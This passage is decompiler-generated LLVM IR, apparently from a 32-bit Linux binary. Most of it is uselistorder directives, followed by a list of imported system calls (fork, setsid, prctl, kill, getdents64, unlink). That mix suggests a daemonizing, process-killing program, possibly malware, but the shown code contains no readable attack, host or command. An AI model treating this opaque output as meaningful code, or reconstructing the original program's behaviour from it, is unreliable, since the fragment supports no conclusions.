dec_label_pc_8052406:                             ; preds = %dec_label_pc_8052406.preheader, %dec_label_pc_8052406
  %v4_8052409 = phi i32 [ %v0_80523fc, %dec_label_pc_8052406.preheader ], [ %v2_805240b, %dec_label_pc_8052406 ]
  %v0_8052406 = phi i32 [ ptrtoint (i32* @global_var_8053000.215 to i32), %dec_label_pc_8052406.preheader ], [ %v1_8052406, %dec_label_pc_8052406 ]
  %v1_8052406 = add i32 %v0_8052406, -4
  call void @__pseudo_call(i32 %v4_8052409)
  %v1_805240b = inttoptr i32 %v1_8052406 to i32*
  %v2_805240b = load i32, i32* %v1_805240b, align 4
  %v10_805240d = icmp eq i32 %v2_805240b, -1
  %v1_8052410 = icmp eq i1 %v10_805240d, false
  br i1 %v1_8052410, label %dec_label_pc_8052406, label %dec_label_pc_8052412.loopexit

dec_label_pc_8052412.loopexit:                    ; preds = %dec_label_pc_8052406
  %v2_8052412.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052412

dec_label_pc_8052412:                             ; preds = %dec_label_pc_8052412.loopexit, %dec_label_pc_80523f0
  %v2_8052412 = phi i32 [ %v2_8052412.pre, %dec_label_pc_8052412.loopexit ], [ %tmp6, %dec_label_pc_80523f0 ]
  ret i32 %v2_8052412

; uselistorder directives
  uselistorder i32 %v0_80523fc, { 1, 0 }
  uselistorder i1 false, { 77, 78, 26, 27, 29, 28, 79, 80, 81, 49, 50, 82, 85, 86, 87, 88, 89, 91, 11, 92, 93, 90, 84, 83, 23, 94, 95, 96, 1, 98, 99, 0, 100, 51, 52, 53, 54, 55, 56, 12, 101, 102, 103, 3, 104, 105, 106, 107, 2, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 108, 31, 32, 33, 34, 35, 36, 37, 38, 39, 121, 122, 123, 124, 125, 126, 127, 128, 129, 10, 131, 130, 135, 132, 133, 134, 13, 136, 137, 97, 24, 4, 25, 138, 139, 15, 57, 58, 59, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 16, 150, 60, 61, 62, 151, 152, 153, 5, 30, 6, 154, 155, 156, 40, 41, 42, 43, 44, 45, 46, 18, 47, 48, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 157, 158, 159, 160, 161, 7, 163, 164, 165, 162, 166, 167, 168, 169, 170, 171, 8, 172, 173, 174, 175, 17, 176, 177, 178, 179, 180, 181, 182, 20, 19, 183, 21, 184, 185, 186, 187, 9, 22, 14, 188 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 15, 16, 17, 18, 74, 75, 76, 77, 11, 78, 3, 73, 19, 69, 12, 70, 71, 72, 13, 0, 9, 10, 79, 80, 81, 82, 83, 84, 85, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 7, 29, 8, 30, 31, 32, 2, 6, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 4, 5, 61, 62, 63, 64, 65, 66, 67, 1, 68 }
  uselistorder i32 ptrtoint (i32* @global_var_8053000.215 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 26, 27, 0, 112, 170, 67, 113, 68, 69, 114, 70, 115, 71, 116, 72, 117, 73, 118, 74, 119, 75, 120, 76, 121, 77, 122, 24, 25, 12, 11, 78, 79, 123, 80, 124, 81, 125, 28, 1, 126, 66, 82, 83, 127, 128, 129, 14, 130, 13, 131, 85, 84, 132, 171, 16, 17, 133, 15, 134, 29, 172, 30, 135, 173, 33, 32, 34, 35, 21, 36, 86, 37, 136, 31, 174, 10, 137, 138, 108, 139, 18, 38, 2, 87, 175, 176, 88, 168, 39, 89, 140, 90, 141, 91, 142, 64, 65, 143, 92, 144, 93, 145, 94, 146, 95, 147, 96, 148, 97, 149, 98, 150, 99, 151, 100, 152, 101, 153, 102, 154, 103, 155, 104, 156, 105, 157, 106, 158, 40, 159, 160, 3, 161, 19, 4, 162, 41, 163, 107, 177, 109, 42, 164, 43, 44, 45, 46, 165, 166, 22, 5, 47, 167, 20, 9, 8, 7, 6, 48, 169, 49, 50, 51, 52, 23, 53, 178, 179, 180, 54, 181, 182, 60, 55, 183, 56, 57, 58, 59, 184, 61, 185, 62, 63, 186, 187, 110, 111 }
  uselistorder i32 1, { 241, 242, 94, 149, 150, 380, 381, 382, 383, 151, 447, 243, 44, 43, 45, 244, 41, 40, 39, 245, 42, 246, 248, 247, 85, 250, 249, 93, 252, 251, 30, 253, 80, 254, 100, 255, 65, 256, 102, 257, 101, 258, 103, 259, 260, 32, 31, 33, 174, 84, 262, 261, 264, 263, 28, 265, 20, 267, 266, 90, 268, 272, 271, 270, 269, 81, 448, 449, 450, 275, 274, 273, 22, 21, 152, 276, 278, 277, 104, 153, 227, 378, 138, 284, 283, 282, 281, 280, 279, 72, 73, 175, 285, 411, 412, 413, 225, 414, 286, 24, 27, 25, 23, 26, 154, 228, 289, 288, 287, 110, 176, 452, 453, 454, 290, 88, 455, 456, 155, 457, 458, 459, 19, 17, 18, 229, 451, 177, 106, 107, 108, 109, 178, 156, 385, 386, 387, 388, 293, 292, 291, 113, 112, 114, 179, 294, 46, 47, 181, 460, 461, 462, 463, 464, 465, 466, 467, 468, 180, 469, 470, 471, 472, 473, 157, 474, 475, 117, 158, 476, 477, 478, 479, 159, 160, 480, 481, 482, 296, 295, 61, 60, 62, 64, 63, 161, 162, 297, 163, 164, 182, 301, 300, 299, 298, 91, 183, 230, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 184, 185, 318, 317, 319, 165, 322, 321, 320, 92, 186, 323, 324, 95, 325, 115, 327, 326, 6, 328, 29, 329, 105, 330, 98, 332, 331, 67, 333, 68, 334, 77, 58, 336, 335, 70, 337, 71, 339, 338, 116, 341, 340, 97, 342, 111, 344, 343, 89, 345, 59, 346, 66, 69, 483, 484, 485, 486, 226, 347, 15, 11, 14, 12, 13, 16, 487, 488, 118, 119, 489, 490, 0, 491, 492, 493, 494, 495, 187, 496, 188, 497, 349, 348, 96, 415, 166, 79, 78, 498, 167, 209, 499, 500, 168, 501, 502, 189, 503, 123, 82, 83, 384, 124, 350, 75, 76, 74, 504, 505, 506, 351, 8, 9, 7, 10, 507, 508, 234, 34, 36, 35, 38, 37, 509, 235, 48, 49, 50, 389, 390, 391, 392, 214, 213, 131, 120, 393, 394, 169, 129, 130, 121, 395, 396, 170, 128, 215, 217, 397, 398, 231, 399, 400, 401, 210, 211, 402, 403, 212, 218, 216, 404, 405, 406, 190, 407, 408, 409, 173, 410, 354, 353, 352, 2, 3, 5, 1, 4, 355, 236, 356, 191, 171, 232, 357, 359, 358, 416, 417, 418, 419, 420, 421, 139, 422, 423, 424, 425, 192, 426, 427, 428, 429, 148, 193, 233, 446, 194, 364, 363, 362, 361, 360, 99, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 369, 368, 237, 240, 367, 366, 238, 365, 86, 87, 510, 511, 512, 513, 514, 125, 126, 515, 516, 517, 518, 519, 198, 132, 133, 197, 134, 201, 135, 520, 521, 199, 136, 137, 200, 522, 127, 122, 523, 524, 525, 526, 527, 219, 140, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 205, 147, 146, 538, 220, 141, 539, 540, 541, 542, 543, 202, 544, 545, 203, 546, 221, 142, 547, 222, 143, 548, 549, 223, 144, 550, 551, 224, 145, 552, 553, 554, 555, 556, 204, 557, 559, 560, 558, 206, 561, 562, 563, 564, 195, 196, 565, 566, 567, 568, 207, 379, 208, 569, 172, 376, 375, 374, 373, 372, 371, 370, 239, 56, 52, 53, 51, 57, 54, 55, 377 }
  uselistorder label %dec_label_pc_8052406, { 1, 0 }
}

define i32 @function_8052416() local_unnamed_addr {
entry:
  %v0_8052419 = load i32, i32* @ebx, align 4
  %v1_805241a = call i32 @function_80480b0(i32 %v0_8052419)
  store i32 %v1_805241a, i32* @eax, align 4
  %v0_8052425 = call i32 @function_80480c0()
  ret i32 %v0_8052425

; uselistorder directives
  uselistorder i32* @eax, { 9, 39, 40, 42, 43, 44, 45, 47, 15, 48, 1, 46, 6, 8, 41, 49, 51, 52, 50, 23, 24, 53, 59, 54, 55, 57, 58, 56, 26, 27, 16, 2, 3, 25, 5, 17, 28, 10, 29, 30, 31, 11, 32, 0, 12, 13, 33, 34, 35, 36, 14, 60, 21, 22, 18, 61, 62, 63, 64, 65, 19, 20, 66, 37, 38, 4, 7 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 560, 67, 361, 68, 425, 426, 69, 427, 428, 429, 70, 131, 132, 460, 461, 71, 431, 561, 562, 563, 183, 564, 565, 566, 439, 462, 463, 567, 416, 415, 568, 569, 570, 417, 464, 465, 466, 467, 413, 571, 572, 573, 72, 574, 133, 579, 580, 10, 73, 362, 11, 363, 364, 582, 583, 128, 584, 74, 346, 75, 184, 185, 0, 575, 576, 577, 76, 414, 356, 77, 365, 585, 1, 134, 135, 78, 586, 587, 79, 80, 589, 588, 23, 24, 590, 593, 186, 347, 594, 596, 595, 21, 22, 597, 578, 468, 469, 470, 471, 366, 367, 50, 472, 182, 368, 136, 81, 598, 27, 348, 82, 137, 602, 605, 604, 25, 26, 608, 609, 610, 611, 612, 138, 613, 614, 615, 187, 606, 188, 607, 189, 369, 440, 61, 441, 139, 370, 442, 443, 616, 617, 618, 619, 620, 621, 622, 623, 624, 140, 141, 625, 371, 637, 372, 373, 190, 349, 374, 191, 350, 83, 375, 626, 627, 84, 85, 192, 351, 63, 628, 629, 630, 86, 87, 193, 352, 62, 631, 129, 632, 52, 633, 634, 636, 376, 635, 2, 603, 591, 592, 418, 419, 421, 420, 28, 29, 3, 142, 422, 423, 424, 430, 473, 474, 377, 378, 475, 476, 477, 478, 479, 480, 481, 482, 379, 432, 483, 638, 601, 433, 639, 484, 485, 434, 581, 64, 143, 599, 435, 486, 600, 487, 640, 436, 641, 642, 380, 643, 8, 88, 381, 644, 194, 645, 646, 144, 647, 12, 30, 53, 13, 54, 14, 648, 4, 31, 55, 15, 56, 16, 90, 89, 57, 17, 91, 92, 93, 437, 65, 488, 489, 94, 382, 358, 649, 650, 651, 652, 653, 654, 97, 96, 95, 655, 148, 99, 98, 100, 383, 656, 127, 384, 438, 385, 386, 9, 101, 387, 58, 18, 102, 388, 103, 389, 390, 391, 359, 360, 444, 445, 44, 42, 392, 43, 41, 393, 446, 447, 448, 449, 450, 451, 452, 149, 394, 453, 454, 455, 456, 353, 395, 396, 457, 458, 66, 104, 459, 145, 105, 157, 164, 165, 166, 155, 156, 490, 106, 32, 33, 491, 492, 493, 107, 48, 494, 495, 496, 497, 108, 47, 498, 499, 500, 501, 109, 46, 502, 503, 504, 505, 110, 45, 506, 507, 508, 158, 159, 160, 161, 162, 163, 509, 510, 153, 152, 511, 150, 7, 6, 151, 512, 154, 513, 167, 514, 168, 515, 169, 516, 170, 517, 519, 520, 521, 518, 522, 523, 171, 172, 524, 146, 525, 111, 548, 19, 59, 354, 397, 398, 399, 526, 532, 173, 527, 528, 174, 529, 175, 530, 176, 531, 36, 533, 177, 178, 534, 179, 535, 536, 180, 537, 181, 538, 539, 540, 541, 400, 542, 543, 544, 545, 35, 195, 112, 113, 401, 402, 546, 547, 49, 60, 114, 403, 34, 196, 198, 199, 404, 115, 116, 197, 355, 200, 117, 118, 549, 550, 551, 552, 553, 554, 657, 658, 555, 556, 659, 660, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 661, 662, 663, 664, 665, 666, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 40, 722, 723, 724, 725, 726, 727, 728, 119, 405, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 406, 767, 759, 760, 761, 762, 763, 764, 765, 766, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 120, 407, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 201, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 843, 842, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 121, 408, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 122, 409, 892, 893, 357, 894, 895, 410, 896, 897, 898, 123, 411, 899, 51, 900, 20, 37, 38, 39, 901, 902, 903, 904, 905, 906, 907, 908, 147, 124, 125, 5, 557, 558, 559, 126, 412, 130, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 909, 910, 911, 912, 913, 914, 915, 916 }
  uselistorder i32* @ebx, { 20, 319, 320, 180, 181, 25, 321, 2, 322, 323, 324, 325, 134, 135, 326, 22, 327, 328, 329, 330, 331, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 3, 201, 202, 203, 21, 332, 333, 334, 335, 336, 337, 338, 339, 340, 18, 19, 349, 350, 351, 352, 15, 4, 14, 343, 346, 347, 348, 341, 353, 354, 355, 356, 357, 358, 359, 360, 342, 204, 205, 369, 370, 371, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 5, 386, 387, 372, 373, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 6, 148, 149, 150, 151, 152, 153, 154, 388, 413, 414, 415, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 16, 399, 400, 401, 402, 403, 7, 404, 405, 406, 407, 408, 409, 410, 411, 412, 367, 368, 23, 24, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 26, 234, 235, 416, 417, 365, 366, 27, 418, 419, 236, 237, 238, 239, 28, 344, 345, 361, 362, 29, 240, 241, 363, 364, 242, 243, 420, 421, 30, 422, 423, 424, 31, 244, 245, 8, 246, 247, 32, 33, 425, 426, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 9, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 248, 249, 250, 0, 251, 252, 253, 254, 255, 256, 10, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 17, 304, 305, 306, 307, 308, 309, 310, 427, 428, 429, 311, 312, 313, 314, 430, 431, 432, 433, 11, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 434, 435, 436, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 1, 466, 467, 468, 469, 470, 13, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 12, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 315, 316, 317, 318 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_5() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_6() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_7() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_8() local_unnamed_addr

declare i16* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
